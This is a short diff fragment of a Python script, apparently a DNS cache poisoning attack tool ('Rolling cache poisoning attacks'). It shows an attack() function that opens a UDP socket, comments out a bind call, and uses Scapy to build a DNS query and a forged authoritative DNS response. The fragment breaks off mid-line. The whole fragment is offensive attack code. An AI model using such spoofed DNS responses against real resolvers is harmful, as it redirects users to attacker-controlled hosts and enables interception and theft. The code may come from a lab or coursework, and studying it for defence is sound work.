@@ -63,7 +63,7 @@ Rolling cache poisoning attacks.
 '''
 def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    sock.bind((my_ip, my_port))
+    # sock.bind((my_ip, my_port))
 
     dns_request = DNS(qr=0, rd=1, ra=0, an=0, ns=0, ar=0, qd=DNSQR(qname=base_domain))
     fake_response = DNS(id=42, qr=1, rd=1, ra=1, aa=1, 
